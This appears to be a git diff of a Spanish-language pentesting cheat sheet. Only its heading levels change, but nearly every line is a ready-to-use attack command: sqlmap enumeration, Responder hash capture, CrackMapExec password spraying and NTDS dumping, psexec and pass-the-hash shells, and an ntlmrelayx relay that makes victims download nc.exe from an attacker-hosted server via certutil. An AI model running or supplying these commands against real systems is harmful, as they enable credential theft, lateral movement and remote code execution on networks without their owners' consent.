@@ -384,11 +384,11 @@ mysqldump -u USER --password=PASS --no-data TABLES
 sqlmap -u URL --method POST --data "username=FUZZ&password=" -P username --dbs --dbms mysql --level 2
 
 ---
-#### Pentest
-## Responder
+## Pentesting
+#### Responder
 python Responder.py -I INTERFACE -rdw  *para capturar Hashes NetNTLM-v2
 
-## CrackmapExec
+#### CrackmapExec
 crackmapexec smb IP/CIDR -u 'USUARIO' -p 'PASSWORD'
 
 crackmapexec smb IP -u 'USUARIO' -p 'Password1' -x whoami
@@ -403,15 +403,15 @@ crackmapexec smb IP -u 'Administrator' -p 'PASS' --ntds vss
 
 crackmapexec smb IP - u 'USUARIO' -p FILE
 
-## PSexec
+#### PSexec
 python3 psexec.py DOMAIN/USER:PASS cmd.exe
 
-## PTH-WINEXE
+#### PTH-WINEXE
 pth-winexe -U DOMINIO/USUARIO%PASS //IP cmd.exe
 
 pth-winexe -U DOMINIO/Administrator%HASH:HASH //IP cmd.exe
 
-## Responder-ntlmrelayx
+#### Responder-ntlmrelayx
 responder.conf  *smb OFF + http OFF*
 
 targets.txt  *agregamos las ips de destino
@@ -420,10 +420,11 @@ python3 ntlmrelayx.py -tf targets.txt -smb2support
 
 python Responder.py -I INTERFACE -rdw
 
-## Responder-ntlmrelayx con smbserver
+#### Responder-ntlmrelayx con smbserver
 python3 ntlmrelayx.py -tf targets.txt -c "certutil.exe -f -urlcache -split IP:PUERTO/nc.exe C:\Windows\Temp\nc.exe"-smb2support
 
 python Responder.py -I INTERFACE -rdw
 
 python -m SimpleHTTPServer
+
 - [Inicio](#Ayuda-memoria)
